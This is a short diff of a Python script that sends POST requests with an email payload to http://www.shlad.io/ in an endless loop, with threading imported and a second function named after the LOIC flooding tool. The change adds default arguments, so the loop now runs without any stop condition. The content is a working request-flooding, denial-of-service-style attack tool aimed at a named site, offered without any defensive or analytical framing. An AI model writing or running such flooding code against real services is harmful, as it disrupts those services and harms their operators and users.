@@ -2,13 +2,13 @@ import requests
 import sys
 import threading
 
-def auto_shlad(target, should_stop):
+def auto_shlad(target='shl@d', should_stop=None):
     data = {
         'email': target,
         'origin':'djankgo'
     }
 
-    while not should_stop.is_set():
+    while not should_stop or not should_stop.is_set():
         requests.post('http://www.shlad.io/', data)
 
 def loic_shlad(n, target):
